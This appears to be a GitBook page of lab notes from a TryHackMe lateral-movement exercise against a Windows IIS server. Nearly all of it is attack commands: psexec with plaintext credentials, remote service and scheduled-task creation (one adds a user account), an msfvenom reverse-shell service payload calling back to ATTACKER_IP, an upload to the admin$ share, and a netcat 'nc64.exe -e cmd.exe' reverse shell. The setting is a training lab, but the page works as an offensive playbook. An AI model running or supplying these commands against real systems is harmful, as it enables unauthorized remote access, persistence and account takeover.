---
description: 'Target : IIS server'
---

# Spawning access remotely

## PSExec

<figure><img src="../../.gitbook/assets/Capture d&#x27;écran 2024-05-06 012209.png" alt=""><figcaption></figcaption></figure>

```
psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
```

### Remotely Creating Services Using sc

<figure><img src="../../.gitbook/assets/Capture d&#x27;écran 2024-05-06 013437.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/Capture d&#x27;écran 2024-05-06 013454.png" alt=""><figcaption></figcaption></figure>

<pre><code><strong># Create and start service 
</strong><strong>sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
</strong>sc.exe \\TARGET start THMservice
#Stop and delete service 
sc.exe \\TARGET stop THMservice
sc.exe \\TARGET delete THMservice
</code></pre>

### Creating Scheduled Tasks Remotely

```
# Create task
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 
# run manually
schtasks /s TARGET /run /TN "THMtask1" 
# delete
schtasks /S TARGET /TN "THMtask1" /DELETE /F

```



## With reverse shell

```
# Generate payload
msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe

# Upload payload
smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
 putting file myservice.exe as \myservice.exe (0.0 kb/s) (average 0.0 kb/s)


```

```
# Listen netcat on another tab
nc -lvp 4443

```

Intermediate machine (connect to netcat with admin account via network authentifcation) :&#x20;

```
runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"

```

Attacker's netcat session&#x20;

```
C:\> sc.exe \\thmiis.za.tryhackme.com create THMservice-3249 binPath= "%windir%\myservice.exe" start= auto
C:\> sc.exe \\thmiis.za.tryhackme.com start THMservice-3249
```

Meterpreter session spawned
